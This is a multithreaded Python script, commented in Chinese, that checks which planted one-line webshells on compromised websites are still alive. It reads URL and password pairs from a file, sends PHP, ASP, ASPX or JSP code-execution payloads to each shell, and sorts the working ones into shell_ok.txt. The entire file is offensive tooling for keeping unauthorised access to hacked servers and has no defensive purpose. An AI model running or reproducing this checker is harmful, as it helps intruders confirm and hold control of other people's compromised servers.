#!/usr/bin/env python
# -*- conding:utf-8 -*- 
import requests,threading,queue,re

list_url=queue.Queue()  #queue容器
url_200=queue.Queue()
url_error=[]
url_ok=[]
url_no=[]
headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        }

with open('shell.txt','r') as f:
    for i in f.readlines():
        i = i.strip('\n')  # 去除\n
        i = re.split(' ', i)  # 空格分割成列表
        list_url.put(i)

class open_url(threading.Thread):
    def __init__(self, num):
        threading.Thread.__init__(self)
        self.num = num

    def run(self):
        print("开始线程：" + str(self.num))
        while not list_url.empty():
            try:
                urls = list_url.get(True,3)    #如果没有数据三秒后退出
                url=urls[0]  #获取url
                html_text = requests.get(url,headers=headers, timeout=3)
                print(url+' ->  '+ str(html_text.status_code))
                if html_text.status_code == 200:    #如果网站状态码是200则添加到url_200里面
                    url_200.put(urls)
            except Exception as e:
                print(e)
        print("退出线程：" + str(self.num))

class open_y(threading.Thread):
    def __init__(self, num):
        threading.Thread.__init__(self)
        self.num = num
    def run(self):
        print("开始线程：" + str(self.num))
        while not url_200.empty():
            try:
                urls = url_200.get(True, 3)  # 如果没有数据三秒后退出
                url = urls[0]  # 获取url
                passwd = urls[1]    #获取一句话密码

                if '.aspx' in url:
                    payload = {passwd: 'Response.Write("SjOkjSer8T8sSrr0NkNf6gfSAS1Xdcy7wXSs8sj");'}
                elif '.asp' in url:
                    payload = {passwd: 'response.write("SjOkjSer8T8sSrr0NkNf6gfSAS1Xdcy7wXSs8sj")'}
                elif '.php' in url:
                    payload = {passwd: 'echo "SjOkjSer8T8sSrr0NkNf6gfSAS1Xdcy7wXSs8sj";'}
                elif '.jsp' in url:
                    payload = {passwd: 'A'}
                else:
                    url_error.append(url + ' ' + passwd)
                    print(url, passwd + ' 无法识别是什么语言！')
                    continue

                try:
                    html_text = requests.post(url,payload,headers=headers,timeout=3)
                except:
                    url_error.append(urls)
                    print('访问异常，已保存到shell_error.txt文件中！')

                if "SjOkjSer8T8sSrr0NkNf6gfSAS1Xdcy7wXSs8sj" in html_text.text:
                    url_ok.append(url+' '+passwd)
                    print(url,passwd+' 存活！')
                elif '.jsp' in url:
                    res = re.findall('->\|(.*?)\|<-',html_text.text)
                    if res !=[''] and res !=[]:
                        url_ok.append(url + ' ' + passwd)
                        print(url, passwd + ' 存活！')
                    else:
                        url_no.append(url + ' ' + passwd)
                        print(url, passwd + ' 失效！')
                else:
                    url_no.append(url + ' ' + passwd)
                    print(url, passwd + ' 失效！')

            except Exception as e:
                print('异常:'+str(e))
        print("退出线程：" + str(self.num))

thread = []
for i in range(5):  #启动多线程 识别状态码是否200
    t=open_url(i)
    thread.append(t)
    t.start()
for i in thread:    #结束多线程
    i.join()

print ("\n判断链接状态码是否200完毕！\n")
#time.sleep(3)

thread = []
for i in range(5):  #启动多线程 确认一句话是否能连接
    t=open_y(i)
    thread.append(t)
    t.start()
for i in thread:    #结束多线程
    i.join()

for i in url_ok:
    with open('shell_ok.txt', 'a') as f:
        f.write(i + '\n')

for i in url_error:
    with open('shell_error.txt', 'a') as f:
        f.write(i + '\n')

for i in url_no:
    with open('shell_no.txt', 'a') as f:
        f.write(i + '\n')

print ("\n程序运行完毕！\n")